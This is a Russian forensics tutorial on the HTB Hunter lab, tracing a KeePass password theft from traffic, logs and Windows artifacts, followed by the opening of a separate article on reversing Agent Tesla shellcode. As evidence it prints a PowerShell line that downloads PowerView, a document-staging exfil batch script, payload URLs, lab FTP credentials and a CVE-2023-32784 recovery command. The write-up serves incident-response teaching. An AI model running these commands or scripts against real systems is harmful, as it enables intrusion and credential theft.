   УРОКИ ФОРЕНЗИКИ
          РАССЛЕДУЕМ КРАЖУ ПАРОЛЕЙ
        KEEPASS НА ПРИМЕРЕ HTB HUNTER





АНАЛИЗИРУЕМ ФАЙЛ PCAP

Анализ артефактов хоста, безусловно, дает огромное количество информа‐
ции о произошедших событиях, но я начал с просмотра трафика, чтобы
понять, какие взаимодействия были с анализируемой машиной.
  Для анализа PCAP-файла я использовал ZUI и Wireshark.


             INFO

                        Подробнее о ZUI читай в статье «ZUI. Анализи‐
                     руем трафик с помощью нового быстрого инстру‐
                           мента».


Начнем с алертов сигнатур опенсорсной IDS Suricata.





                              Алерты Suricata

В глаза бросается использование Kali Linux, о чем говорит вот эта сигнатура:


ET POLICY Possible Kali Linux hostname in DHCP Request Packet

Найдем информацию об использовании DCHP:


_path=="dhcp" | select ts, client_addr, server_addr, mac, host_name,
client_fqdn, domain, assigned_addr

В 11:31:18 21 июня 2023 года хосту kali назначен IP 172.17.79.133. Добавим
это в таймлайн IRIS.




                           Использование DHCP

Также мы видим, что в широковещательном домене есть следующие хосты:
 • 172.17.79.131 —  Forela-Wkstn002.forela.local  (анализируемый
  нами хост);
 • 172.17.79.132 — DESKTOP-887GK2L.

Посмотрим,  с  кем  взаимодействовал  Forela-Wkstn002.forela.local
(172.17.79.131). Для начала сделаем сортировку по тегам.





                               Статистика по тегам


FTP
Посмотрим тег ftp:


fuse | 172.17.79.131 | _path=="ftp" | sort -r ts

Увидим сетевые взаимодействия с FTP-сервером 13.235.18.128.
   Давай подробнее посмотрим в Wireshark:


ftp || ftp-data

Обнаружим авторизацию на FTP-сервере.



                        Авторизация по протоколу FTP

Посмотрим, какие файлы эксфильтровал злоумышленник, и сохраним их.





                           Эксфильтрованные файлы

Время сетевого взаимодействия: 12:20:16.012196  —  12:23:04.994762.
Набор файлов keepassproc.zip и Database.kdbx указывает на то, что хакер
мог извлечь пароли из базы данных, используя уязвимость CVE-2023-32784.


SMB
Посмотрим сетевые соединения, тег conn:


fuse | 172.17.79.131 | _path=="conn"





                          События с тегом conn

Мы видим сессии от kali (172.17.79.133) к Forela-Wkstn002.forela.local
(172.17.79.131) по 445-му порту (SMB). Эта сессия не была отнесена анализа‐
тором к SMB (вспоминаем, что захвачен был не весь сетевой трафик). Перей‐
дем в Wireshark.




                            SMB-сессии

Сессия связана с  Kali, можем предположить, что  используется  утилита
impacket-psexec.
   Время сетевого взаимодействия: 11:25:09.263058 — 11:33:35.584495.


RDP
Продолжим анализ сетевых сессий и проверим наличие RDP:


fuse | 172.17.79.131 | _path=="conn" | cut ts,id | 3389





                             RDP-сессии

Посмотрим в Wireshark:


tcp.port==3389





                             RDP-сессии

Время сетевого взаимодействия: 12:18:35.508604 — 12:23:34.962134
   Добавим информацию об IoC.



                           Информация об IoC

И о событиях.





                          Таймлайн инцидента

В результате анализа трафика мы узнали, что злоумышленнику удалось ском‐
прометировать учетные данные для хоста Forela-Wkstn002.forela.local,
эксфильтровать дамп процесса и базу данных KeePass, а также архив с про‐
ектом.


АНАЛИЗИРУЕМ ЖУРНАЛЫ СОБЫТИЙ WINDOWS

Начнем анализ артефактов Windows, для чего снова пустим в ход Hayabusa.
   Посмотрим сводку по авторизациям:


./hayabusa logon-summary -d ~/Hunter_Acquisition/Acquisition/2023-06-
22T092426_Acquisition/C/





                         Сводка по авторизациям

Можем подтвердить, что с хоста 172.17.79.133  (Kali) было подключение
по RDP.
   Запустим анализ событий правилами Sigma и hayabusa-rules:


./hayabusa csv-timeline -d ~/C/ --output ~/hayabusa_last.csv --UTC





                            Сводка по правилам

Сразу в глаза бросаются алерты:
 • Defender Alert;
 • PowerView PowerShell Cmdlets — ScriptBlock.

Дальше работать с результатами Hayabusa будем в ZUI.
   Давай поищем авторизации с Kali:


EventID==4624. | 172.17.79.133





                              Авторизации с Kali

Наши предположения об авторизациях подтвердились.


PsExec
Отфильтруем события по Logon ID 0x26fbee и увидим последовательность
событий, похожую на работу PsExec. Далее поищем события, связанные
с созданием служб в нужный нам интервал времени: EventID==7045.  |
"2023-06-21".



                           Обнаружение PsExec

К индикаторам можем отнести название исполняемого файла и имя службы:
 • служба: tFdj;
 • путь к исполняемому файлу: %systemroot%\\owUjOMCY.exe;
 • время: 2023-06-21T11:19:34 .


        WWW

                             Детектируем    горизонтальное   перемещение
                        с SMBExec и AtExec (Хабрахабр)


К сожалению, событий создания или завершения процесса в нашем интерва‐
ле нет.



           Отсутствие событий создания или завершения процессов

Давай отсортируем по типам правил:


"06-21" | count() by RuleTitle | sort -r count

И точечно посмотрим на некоторые.


Meterpreter
"06-21" | RuleTitle=="Antivirus Hacktool Detection"

Событие  с  EventId=1116  из   журнала  Microsoft-Windows-Windows
Defender/Operational:


Threat: Trojan:Win64/Meterpreter.E ¦ Severity: Severe ¦ Type: Trojan
¦ User: NT AUTHORITY\SYSTEM ¦ Path: file:_C:\Users\alonzo.spire\
notepad.exe; shellopencmd:_HKLM\SOFTWARE\CLASSES\txtfile\shell\open\
command\\ ¦ Proc: Unknown

Оно сигнализирует нам о том, что файл C:\Users\alonzo.spire\notepad.
exe определен как Trojan:Win64/Meterpreter.E. и пытался закрепиться
или закрепился, используя следующую ветку реестра:


HKLM\SOFTWARE\CLASSES\txtfile\shell\open\command\\

Время обнаружения: 2023-06-21 12:33:55.002.


Загружаем PowerView
Посмотрим события, связанные с работой PowerShell.


"06-21" | PwSh | Details!="HostApplication: n/a"

В  результате получим  много событий EventId=4104 и одно событие
EventId=400.
   Событие ниже  свидетельствует о загрузке злоумышленником утилиты
PowerView, предназначенной для постэксплуатации в средах Active Directory.
Утилита сохранена с именем clean.ps1.
   Время регистрации события — 2023-06-21 11:30:40.755.


Data: Available ¦ Data: NewEngineState=Available
PreviousEngineState=None SequenceNumber=13 HostName=ConsoleHost
HostVersion=5.1.19041.2673 HostId=b9505ee1-faf5-41b3-af08-
7dddad696ee3 HostApplication=powershell -c (New-Object Net.WebClient)
.DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/
PowerSploit/master/Recon/PowerView.ps1', 'clean.ps1')
EngineVersion=5.1.19041.2673 RunspaceId=248a767b-db92-435f-bda4-
5e42213ebf64 PipelineId= CommandName= CommandType= ScriptName=
CommandPath= CommandLine= ¦ Data: None

События 4104 регистрируют куски кода PowerView, которые используют по‐
дозрительные функции.


RDP
Давай уточним время работы хакера по RDP. Для этого еще раз обратимся
к событиям авторизации и к журналам:
 • Terminal-Services-RemoteConnectionManager/Operational;
 • TerminalServices-LocalSessionManager/Operational.


"06-21" | 4624. or "RDS-"





                              Авторизации RDP

Можем предположить, что RDP-сессия длилась с 2023-06-21 11:44:51.426
по 2023-06-21 12:53:45.809.


        WWW

                        •Просмотр и  анализ логов RDP-подключений
                         в Windows (WinITPro)
                   •RDP Flowchart (PDF, Google Drive)
                        •DFIR-03:   RDP     Authentication     Artifacts
                           (Cyb3rSn0rlax)


На этом интересные события закончились, не забудем внести информацию
в IRIS.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   УРОКИ ФОРЕНЗИКИ
          РАССЛЕДУЕМ КРАЖУ ПАРОЛЕЙ
        KEEPASS НА ПРИМЕРЕ HTB HUNTER





АРТЕФАКТЫ ВЫПОЛНЕНИЯ ПРОЦЕССОВ

SRUM
Начнем со SRUM (Windows System Resource Usage Monitor), так как в нашем
инциденте много сетевых взаимодействий.
   Получим информацию из SRUM в виде JSON с помощью тулзы сhainsaw.


./chainsaw analyse srum -s ./2023-06-22T092426_Acquisition/C/Windows/
System32/config/SOFTWARE ./2023-06-22T092426_Acquisition/C/Windows/
System32/SRU/SRUDB.dat -o ./srum_chainsaw.json

В результате имеем вывод, как на скриншоте ниже.





                         Вывод работы chainsaw

Загрузим полученный файл в ZUI и начнем анализ с таблицы Windows Network
Data Usage Monitor.


over this | TableName=="Windows Network Data Usage Monitor" | fuse |
cut TimeStamp, UserName, AppName, AppId, BytesRecvd, BytesSent |
sort -r TimeStamp


2023-06-21T12:53:00Z
\device\harddiskvolume3\program files\filezilla ftp client\filezilla.
exe


                       FileZilla, сетевое взаимодействие из SRUM


2023-06-21T12:53:00Z
\device\harddiskvolume3\windows\system32\certutil.exe


                      Certutil, сетевое взаимодействие из SRUM


2023-06-21T12:17:00Z
\device\harddiskvolume3\windows\system32\windowspowershell\v1.0\
powershell.exe


                PowerShell, сетевое взаимодействие из SRUM


2023-06-21T12:17:00Z
\device\harddiskvolume3\windows\system32\certutil.exe


                      Certutil, сетевое взаимодействие из SRUM


2023-06-21T12:17:00Z
\device\harddiskvolume3\program files\process hacker 2\processhacker.
exe


              Process Hacker, сетевое взаимодействие SRUM

Можем предположить, что данные украли с использованием FileZilla, а дамп
процесса KeePass сделали через Process Hacker. Новым обстоятельством
для нас становится использование тулзы certutil, которая позволяет загружать
файлы.
   Давай посмотрим информацию в таблице App Timeline Provider. После
выполнения PsExec злоумышленник получает доступ в контексте учетной
записи NT  AUTHORITY\System. Следующий запрос поможет нам понять,
какие процессы запускал хакер.


over this | "06-21" | TableName=="Application Resource Usage
Provider" or TableName=="App Timeline Provider" | fuse | cut
TimeStamp,EndTime, DurationMS, UserName, AppName, TableName | sort -r
 EndTime | UserName=="systemprofile"





                      Процессы пользователя SYSTEM

Можем предположить, что были выполнены команды net1.exe, net.exe
и PowerShell. Запуск PowerShell совпадает со временем регистрации загрузки
PowerView.
   Какие процессы были связаны с пользователем alonzo.spire?


over this | "06-21" | TableName=="Application Resource Usage
Provider" or TableName=="App Timeline Provider" | fuse | cut
TimeStamp,EndTime, DurationMS, UserName, AppName, TableName | sort -r
 EndTime | UserName=="alonzo.spire"





              Процессы из SRUM для пользователя alonzo.spire

Из SRUM мы узнали, что пользователь alonzo.spire создавал такие процес‐
сы:
 • keepass;
 • filezilla;
 • powershell;
 • powershell_ise;
 • WinRAR;
 • RAR;
 • ProcessHacker.


Prefetch
Давай заглянем в Prefetch-файлы, они содержат время последних восьми
запусков процесса и информацию о файлах, с которыми процесс взаимодей‐
ствовал.
   Файлы Prefetch расположены в C:\Windows\prefetch\. Парсим их скрип‐
том и закидываем в ZUI. Начнем анализ с данных, которые у нас уже есть.


Сессия PsExec
Служба PsExec — owujomcy.exe (over this | sort -r last_exec_time).





                               Команды PsExec

На скриншоте выше представлены процессы, предположительно связанные
с  сессией PsExec: owujomcy.exe, cmd.exe, whoami.exe, certutil.exe,
powershell.exe, net.exe, net1.exe. Похоже на стандартный набор команд,
выполняемых при компрометации машины.
   Опытный читатель знает, что в Prefetch хранится информация о взаимо‐
действии процесса с другими файлами в первые десять секунд его работы.
Как мы видим из скриншота выше, времени между командами прошло гораз‐
до больше.
  В файлах и директориях, связанных с процессом certutil.exe, аномалий
не нашлось, поэтому можем убрать его из цепочки процессов выше.
   Время запуска процессов:
 • WHOAMI.EXE — 2023-06-21T11:19:59.915253;
 • POWERSHELL.EXE —  2023-06-21T11:30:39.567358   (совпадает
   со временем загрузки PowerView, но в связях отсутствует файл clean.
  ps1);
 • NET1.EXE — 2023-06-21T11:33:20.404245;
 • NET.EXE — 2023-06-21T11:33:20.326231.


RDP-сессия
Давай посмотрим процессы, которые предположительно относятся к RDP-
сессии.





                          Процессы из RDP-сессии

Сравниваем с результатами, полученными из SRUM. Ничего нового не появи‐
лось, но давай глянем еще данные о прошлых запусках и о связанных файлах.
   Время запусков POWERSHELL.EXE:
 • 2023-06-21T11:51:01.844703;
 • 2023-06-21T11:20:59.195584;
 • 2023-06-21T11:20:28.235246;
 • 2023-06-21T11:20:21.166621;
 • 2023-06-21T11:19:56.205089;
 • 2023-06-21T11:19:49.169370;
 • 2023-06-21T11:19:30.172513;
 • 2023-06-21T11:19:11.784861.

Время запусков FILEZILLA.EXE:
 • 2023-06-21T11:59:54.640629;
 • 2023-06-21T11:59:46.703003.

В связанных файлах ничто не указывает на эксфильтрацию, но мы помним
про первые десять секунд.
   Процесс RAR.EXE предоставил достаточно новой информации: RAR.EXE —
2023-06-21T12:13:15.784399.





                  Файлы, связанные с процессом RAR.EXE





                  Файлы, связанные с процессом RAR.EXE

На  скриншотах выше мы видим,  что хакер  создал директорию Exfil
и копировал туда файлы.
   Процесс WINRAR.EXE:
 • 2023-06-21T12:18:04.408710;
 • 2023-06-21T12:07:55.183899.





                Файлы, связанные с процессом WINRAR.EXE

Процесс CERTUTIL.EXE:
 • 2023-06-21T12:29:49.237697;
 • 2023-06-21T12:29:42.612611;
 • 2023-06-21T12:12:35.575593.

В связях нашлось кое‑что интересное.





               Файлы, связанные с процессом CERTUTIL.EXE

Из общей картины в глаза бросаются файлы вот в этом пользовательском
каталоге:
   \VOLUME{01d951602330db46-52233816}\USERS\ALONZO.SPIRE\
   Вот их полный список:


APPDATA\LOCALLOW\MICROSOFT\CRYPTNETURLCACHE\METADATA\
3DC3856568F41DEBDC478970629B1FC6
APPDATA\LOCAL\MICROSOFT\WINDOWS\INETCACHE\IE\4TSWMJTT\NOTEPAD[1].EXE
NOTEPAD.EXE
APPDATA\LOCAL\MICROSOFT\WINDOWS\INETCACHE\IE\TFR2JWYD\NOTEPAD[1].EXE
APPDATA\LOCALLOW\MICROSOFT\CRYPTNETURLCACHE\METADATA\
A3CEB2B928510B461A9B19D9B4B8D5B6
APPDATA\LOCALLOW\MICROSOFT\CRYPTNETURLCACHE\CONTENT\
A3CEB2B928510B461A9B19D9B4B8D5B6
APPDATA\LOCAL\MICROSOFT\WINDOWS\INETCACHE\IE\OOI66Y9I\SCOUT[1].BAT
PICTURES\SCOUT.BAT

Поиск строки user-agent с упоминанием certutil в трафике не дал результатов,
скорее всего, из‑за того, что дамп неполный.
  Нам предстоит узнать содержимое файла scout.bat и notepad.exe.


Shimcache и Amcache
Продолжим анализ артефактов, указывающих на запуск или наличие файлов
процессов Shimcache и Amcache. Для их  анализа будем использовать
chainsaw и ZUI.


             INFO

                    При анализе Shimcache стоит помнить, что в нем
                        могут храниться файлы, которые не запускались,
                       а  были  отображены  в  проводнике  Windows
                             (explorer.exe).





                          Данные из Shimcache

Ничего нового мы не обнаружили, за исключением времени последнего
изменения   файла:   C:\Users\alonzo.spire\notepad.exe   запускался
в 2023-06-21T12:29:49.597Z.
   Перейдем к Amcache. Для его анализа воспользуемся утилитой RegRipper.


regripper -r /data/Amcache.hve -p amcache

В Amcache удалось найти хеш SHA-1 файла службы PsExec:


2023-06-21T11:33:14.594430700Z
c:\windows\owujomcy.exe 23873bf2670cf64c2440058130548d4e4da412dd





                                   VirusTotal PsExec




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   УРОКИ ФОРЕНЗИКИ
          РАССЛЕДУЕМ КРАЖУ ПАРОЛЕЙ
        KEEPASS НА ПРИМЕРЕ HTB HUNTER





АРТЕФАКТЫ ФАЙЛОВОЙ И ОПЕРАЦИОННОЙ СИСТЕМЫ

$MFT
Спарсим C:\$MFT утилитой MFT и загрузим данные в ZUI.
   Найдем, где были сохранены файлы clean.ps1 и Scout.bat.



                          Расположение clean.ps1



                          Расположение Scout.bat

Посмотрим, есть ли информация о файлах, которые хакер эксфильтровал:


fuse | keepassproc.zip or Database.kdbx or redacted




                Информация об эксфильтрованных файлах



                 Время создания дампа процесса KeePass

Из скриншота выше мы узнаём, что дамп процесса KeePass был сделан
в 2023-06-21T12:06:42.281943Z.


Windows Search Database
В качестве последнего артефакта ОС рассмотрим Windows Search Database.
Для его анализа воспользуемся утилитой sidr.


./sidr ~./2023-06-22T092426_Acquisition/C/ -f json -o ~/sidr/

В результате мы получили три файла:
 • File_Report_20240503_120219.452284.json;
 • Internet_History_Report_20240503_120219.452528.json;
 • Activity_History_Report_20240503_120219.452589.json.

Нас интересует первый файл, давай загрузим его в ZUI.
   Посмотрим, какие расширения файлов есть в базе:


fuse | "06-21" | count() by System_ItemType | sort -r count





             Расширения файлов в Windows Search Database

Наибольший интерес для нас представляет информация о .bat:


fuse | "06-21" | System_ItemType==".bat


                     Информация о файле Scout.bat

В последнем столбце — часть содержимого batch-файла. Скрипт ниже пред‐
ставлен не полностью, поскольку остальные строки в нем закомментированы.


set "source=%userprofile%"
set "destination=%temp%\Exfil"


if not exist "%destination%" mkdir "%destination%"


for /r "%source%" %%a in (*.docx *.docm * .pdf * .xls * .txt * .ppt *.
xlsx * .pptx) do (
    copy "%%a" "%destination%"
)


cd %TEMP%\E xfil
"C:\Program Files\WinRAR\Rar.exe" a Exfil

Вот что делает скрипт:
 • устанавливаются переменные source и destination;
 • если директория %temp%\Exfil отсутствует, она создается;
 • копируются файлы, подходящие под маску;
 • создается архив %TEMP%\Exfil\Exfil.rar.


АРТЕФАКТЫ ИСПОЛЬЗУЕМЫХ ПРИЛОЖЕНИЙ И УТИЛИТ

FileZilla
В директории можем посмотреть конфиг FileZilla.


C:\Users\alonzo.spire\AppData\Roaming\FileZilla\recentservers.xml
<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3 version="3.63.2.1" platform="windows">
    <RecentServers>
        <Server>
            <Host>13.235.18.128</Host>
            <Port> 21</Port>
            <Protocol>0</Protocol>
            <Type> 0</Type>
            <User>theyoungwolf</User>
            <Pass encoding="base64">VGhlTG9uZ05pZ2h0SXNDb21pbmc=</
Pass>
            <Logontype> 1</Logontype>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <EncodingType> Auto</EncodingType>
            <BypassProxy> 0</BypassProxy>
        </Server>
        <Server>
            <Host>ypmlads.ftp.fileserver</Host>
            <Port> 4825</Port>
            <Protocol>0</Protocol>
            <Type> 0</Type>
            <User>cyberjunkie</User>
            <Pass encoding="base64">VWlvbnNrSEdUTERT</Pass>
            <Logontype> 1</Logontype>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <EncodingType> Auto</EncodingType>
            <BypassProxy> 0</BypassProxy>
        </Server>
        <Server>
            <Host>13.45.67.23</Host>
            <Port> 21</Port>
            <Protocol>0</Protocol>
            <Type> 0</Type>
            <User>alonzo.spire</User>
            <Pass encoding="base64">VGhlQXdlc29tZUdyYXBl</Pass>
            <Logontype> 1</Logontype>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <EncodingType> Auto</EncodingType>
            <BypassProxy> 0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>

Изучив этот файл, можем предположить, что хакер пытался подключиться
к нескольким FTP-серверам. Добавим их в IoC.


Certutil
Кеш утилиты certutil (yet) находится в этой директории:


C:\Users\alonzo.spire\AppData\LocalLow\Microsoft\CryptnetUrlCache

Содержимое Scout.bat:


C:\Users\alonzo.spire\AppData\LocalLow\Microsoft\CryptnetUrlCache\
Content\A3CEB2B928510B461A9B19D9B4B8D5B6

URL для загрузки Scout.bat:


hxxp://oakfurnitures.uk/ovxlabd/campaign/uk_orgs/Scout.bat

Найти этот URL можно здесь:


C:\Users\alonzo.spire\AppData\LocalLow\Microsoft\CryptnetUrlCache\
MetaData\A3CEB2B928510B461A9B19D9B4B8D5B6

URL для загрузки notepad.exe:


hxxp://oakfurnitures.uk/ovxlabd/campaign/uk_orgs/notepad.exe

Находится в этом файле:


C:\Users\alonzo.spire\AppData\LocalLow\Microsoft\CryptnetUrlCache\
MetaData\cat 3DC3856568F41DEBDC478970629B1FC6


История PowerShell
Историю команд, выполняемых в консоли PowerShell, можем найти в сле‐
дующем файле:


C:\Users\alonzo.spire\AppData\Roaming\Microsoft\Windows\PowerShell\
PSReadline\ConsoleHost_history.txt

Его содержимое представлено ниже. Выполняются команды из PowerView.


powershell -ep bypass
. .\clean.ps1
Get-NetDomainController
Get-NetDomainUsers
Get-NetUsers
Get-NetUser


KeePass CVE-2023-32784
Настало время разобраться с дампом процесса KeePass и с украденной
базой паролей. Для эксплуатации уязвимости я воспользовался скриптом
с GitHub. Дамп хранится в архиве с паролем, и могу сказать, что наш хакер
не очень любит использовать разные пароли.
  Для использования скрипта введем команду


python3 keepass_dump.py -f ~/Downloads/Hunter_Acquisition/
keepassproc.dmp --recover

В результате получим восстановленный пароль от KDBX, в котором хранятся
учетные данные администратора домена Active Directory.


ВЫВОДЫ

В процессе расследования мы вспомнили, где искать некоторые артефакты
Windows, файловой системы NTFS и утилит, которыми могут пользоваться
хакеры.
  Мы воссоздали таймлайн инцидента в IRP. Ниже — получившаяся полная
картина.





                          Таймлайн инцидента

В заключение хочу посоветовать аналитикам внимательно подходить к изу‐
чению артефактов и собирать инструментарий на все случаи жизни.
ВЗЛОМ





В сегодняшней статье я покажу, что делать
с извлеченным из вредоноса шелл‑кодом:
будем его запускать и отлаживать. Раз‐
беремся, как работать с функцией WinAPI,
если она вызывается по хешу, а в процессе              Nik Zerof                                                                                              xtahi0nix@gmail.com
отладки  расшифруем  полезную  нагрузку
и научимся извлекать инфу из обфусци‐
рованных файлов .NET.


Мы продолжим работу, начатую в моей прошлой статье, где мы начали ревер‐
сить Agent Tesla и вытащили шелл‑код из инсталлятора NSIS.


ЗАГРУЖАЕМ ШЕЛЛ-КОД В ДИЗАССЕМБЛЕР

В прошлый раз мы договорились использовать Ghidra, продолжим традицию
и в этой статье. Итак, загружаем файл c шелл‑кодом в дизассемблер и видим,
что начало шелл‑кода не дизассемблировалось: перед нами просто необ‐
работанные байты. Это не нужно игнорировать, потому что неправильное
начало анализа может поломать кучу остального проанализированного кода.





    Результат загрузки шелл‑кода, первые байты не дизассемблировались

Не страшно, просто ставим курсор на начало байтовой строки и выбираем
в контекстном меню Disassemble, дальше Ghidra сделает все за нас.





                        Исправили дизасм шелл‑кода

После того как привели анализ в порядок, видим с самого начала шелл‑кода
переход в функцию. Идем в нее и смотрим в начало — там видим портянку
кода, где данные помещаются на стек. Приводим эти данные в удобочи‐
таемый вид (приводим числа в char в контекстном меню), видим появившееся
название файла djdqvq.sra. Вспоминаем, что это один из трех файлов,
которые находились в NSIS-инсталляторе. Стало быть, шелл‑код работает
с этим файлом.





                   Шелл‑код работает с djdqvq.sra

Интересно, что будет, если загрузить этот файл в DIE? Инструмент не опре‐
делил ровным счетом ничего, но на вкладке энтропии можно увидеть картину,
характерную для сплошного шифротекста.





                              Энтропия djdqvq.sra

Ладно, пока к этому файлу не подступиться, не разобрав шелл‑код, поскольку
именно он — ключик к этому файлу. Возвращаемся в Ghidra и листаем уже
открытую функцию вниз, видим работу с большими числами.





                        Вызовы WinAPI по их хешу

Наметанный глаз сразу заметит, что это похоже на вызовы WinAPI по хешу —
одну из техник сокрытия использования WinAPI в коде. Кроме того, если пос‐
мотреть по ссылкам, есть масса похожего кода с передачей хеша в функцию
FUN_00000073, то есть эта функция еще и вызывается по всему коду. Сом‐
нений в назначении FUN_00000073 нет, но есть проблема: статическим ана‐
лизом это не победить (писать скрипт, имплементирующий алгоритм фор‐
мирования хеша, не предлагать), нужно идти в отладчик.





  Вызовы FUN_00000073 с передачей хеша в качестве аргумента находят‐
  ся по всему коду


ЗАГРУЖАЕМ ШЕЛЛ-КОД В ОТЛАДЧИК

Отладчик помогает разобраться в коде по ходу его работы, но как заставить
работать дамп шелл‑кода? Это же, мягко говоря, не обычный исполняемый
файл, и, если загрузить этот дамп прямо в отладчик, он скажет «фи» и выдаст
ошибку. Не беда, есть несколько способов отладки шелл‑кода:
 • написать тулзу, которая прямо в своем коде вызывает шелл‑код, хра‐
   нящийся как байтовый массив;
 • использовать уже готовый инструмент, который создаст из шелл‑кода PE-
   файл, а дальше его можно будет загрузить и отладить как обычный файл;
 • использовать тулзу, которая загружает шелл‑код в память и исполняет его
   в своем контексте, а отладчиком мы присоединяемся к ее процессу.

Независимо от выбора в итоге мы должны оказаться в отладчике, в начале
шелл‑кода.


Декодируем хеши WinAPI
Отладчик x86dbg (x64dbg) — замечательный инструмент, достойный пре‐
емник всеми любимого OllyDbg. Почему бы нам не заставить его работать
на нас, автоматизируя процесс декодирования хешей? Давай попробуем,
но для этого придется немного покопаться в листинге кода и найти некоторые
закономерности.
   Разумеется, нам интересна функция вызова хендлов WinAPI по их хешу,
в Ghidra она называется FUN_00000073 — это значит, что RAW-смещение сос‐
тавляет 0x73 байта от начала шелл‑кода.
   Чтобы найти эту функцию в x86dbg, нужно к начальному адресу памяти,
по которому у нас загружен шелл‑код, прибавить 0x73. Например, у меня
шелл‑код загрузился по адресу 0x00FB0000, следовательно, чтобы поставить
точку останова на начало функции, в x86dbg нужно ввести команду bp
0x00FB0000 + 0x73 и запустить выполнение либо долистать до этого адреса
вручную и нажать F2.
   Разумеется, при вызове функции на стеке будут лежать ее аргументы,
которые можно видеть в окне обзора стека в x86dbg. Там мы можем увидеть
передаваемые значения хешей и файл системной библиотеки, откуда берет‐
ся адрес получаемой функции.
   Если позволить выполниться этой функции до конца (до ret), то можно
увидеть, что в EAX лежит результат ее работы — адрес WinAPI ExitProcess.
Если поставить бряк на то место, где мы сейчас стоим (инструкция ret фун‐
кции FUN_00000073, ее последняя инструкция), и пустить отладчик дальше, то
в EAX мы увидим следующее декодированное имя WinAPI.
   Получается, когда мы стоим на смещении RAW 0xC9 (у меня 0x00FB0000 +
0xC9 = 0x00FB00C9), то в EAX будет адрес декодированной WinAPI.
   Итак, последовательность действий обозначили, осталось ее сказать
отладчику, чтобы он ее реализовал самостоятельно.
   Входим в режим редактирования условия брейк‑пойнта, установленного
на смещении 0xC9, и задаем условия действий.





     Редактируем точку останова x86dbg и учим его декодировать WinAPI

В  качестве самописца будет  выступать лог  отладчика. Основные поля,
которые мы заполнили:
 • Log Text со значением { a:eax } ;
 • Command Text со значением bp eax;run;.

Значение a:eax говорит отладчику записывать в лог содержимое EAX, трак‐
товать его как адрес и получать информацию о нем точно так же, как это про‐
исходит в окне отображения регистров, когда происходит останов на ret
в функции вызова WinAPI по хешу. Вторая строчка просто говорит отладчику
ставить брейк‑пойнт, то есть останавливаться в конце этой функции.


             INFO

                   Я видел, как люди пишут декодер хешей WinAPI
                       на Python в виде скрипта для IDA Pro, чтобы раз‐
                       матывать алгоритм хеширования, а затем реали‐
                       зуют его в скрипте. Техника, которую я демонс‐
                         трирую здесь, намного проще, но имеет тот же
                       эффект, потому что при такой декодировке тоже
                         можно будет разметить листинг дизассемблера,
                            только вручную.



Исследуем djdqvq.sra
Теперь, трассируя шелл‑код, мы можем начать расшифровку оставшегося
файла djdqvq.sra, который приберегли с самого начала.
   Внимательно смотрим на трассу выполнения (лог отладчика), помечаем
интересные функции, чтобы при повторном заходе к ним вернуться. Одна
из таких функций — lstrcatW, она собирает две строки в одну. Если пос‐
мотреть на стек, то сразу увидим ее аргументы.





       Аргументы функции lstrcatW, отображаемые в окне стека x86dbg

Понятно, что дальше идет код копирования файла djdqvq.sra из установ‐
щика во временный каталог (по сформированному функцией lstrcatW пути),
который виден на скриншоте. Дальше идет его открытие при помощи
CreateFileW. Так как дело происходит в извлеченном шелл‑коде, конечно,
будет ошибка, потому что файл не скопируется.
   Чтобы наша отладка не сломалась, нужно просто скопировать файл
djdqvq.sra во временную папку самостоятельно (естественно, все делаем
в  виртуальной машине,  отключенной от  интернета). Не  забываем,  что
djdqvq.sra зашифрован, поэтому далее идет вызов VirtualAlloc, выделя‐
ющий память для расшифрованного кода. Теперь останавливаемся на инс‐
трукции ret функции VirtualAlloc.





     Выделение буфера памяти для расшифрованного кода из djdqvq.sra

Дальше стандартный алгоритм действий:
 1. Извлекаем функцией VirtualAlloc из регистра EAX адрес выделенной
   памяти.
 2. Ставим точку останова по доступу на начало выделенной области памяти.
 3. После  установки брейк‑пойнта отпускаем программу на выполнение.
   Основная цель здесь — отловить момент, когда полезная нагрузка будет
   расшифрована или начнет выполняться. Нужно быть готовым к тому, что
    точка останова  сработает  несколько раз. В памяти ждем появления
   осмысленного кода или заголовка исполняемого файла PE  (Portable
   Executable).
 4. В конце дампим полезную нагрузку в файл силами x86dbg (Dump Memory
   To File — так же, как мы сбрасывали шелл‑код в предыдущей статье).

После прохождения этих шагов загрузим полученный файл в DIE.





                     Расшифрованный djdqvq.sra в DIE

DIE сразу же анализирует весь файл, и мы наблюдаем такую картину:
 • файл ничем не запакован, энтропия нормальная;
 • имеется ресурс, который был распознан как нечто с заголовком PE (!);
 • ресурс написан на .NET.


             INFO

                        Раньше DIE не сканировал ресурсы, такая воз‐
                      можность появилась в последних версиях. Всегда
                          используй  последние  версии:  помимо  новых
                         багов, в них могут быть интересные возможности!
                    Но что, если у тебя старый DIE? То, что в файле
                             производится работа с ресурсами, можно опре‐
                         делить, например, по импортируемым API-фун‐
                           кциям.


При помощи Process Hacker вытаскиваем ресурс, который  оказывается
исполняемым файлом .NET. В принципе, тут есть два подхода: попробовать
декомпилировать ресурс и  надеяться, что он не обфусцирован  (иначе
еще придется разбираться с обфускацией), либо попытаться динамически
вытащить инфу из  этого файла, используя стороннее ПО. Естественно,
выберем второй путь: он быстрее и проще, а время, как известно, деньги.


GarbageMan
Классические вирусы обычно пишут на C/C++, ассемблере и прочих низ‐
коуровневых языках. Но это не обязательно делает их наиболее эффектив‐
ными. Малварь, написанная на .NET, может доставить кучу проблем, потому
что методы обфускации этого кода стали весьма могучими.
  В какой‑то степени этому помогло открытие исходников платформы .NET.
Конечно же, вирмейкеры изучили исходники и сделали соответствующие
выводы. В итоге мы имеем многослойное шифрование, различные манипу‐
ляции с процессами, массу антиотладочных и обфусцирующих приемов.
   Чтобы как‑то решать такие проблемы, была создана замечательная прог‐
рамма под названием GarbageMan. Она нам и поможет в анализе файла.
Дело в том, что рабочий Heap и стек .NET-приложения представляют собой
настоящий кладезь информации о типах данных, связанности объектов друг
с другом и прочих вещах. При помощи GarbageMan мы будем ее извлекать
и исследовать.
  GarbageMan создает снимки состояния загруженного в него приложения
и отображает информацию: даже если в файле используется обфусцирова‐
ние или шифрование (как в нашем случае), во время выполнения вредонос
расшифрует эту информацию.
   Загрузим наш .NET-файл в GarbageMan и наделаем несколько снимков
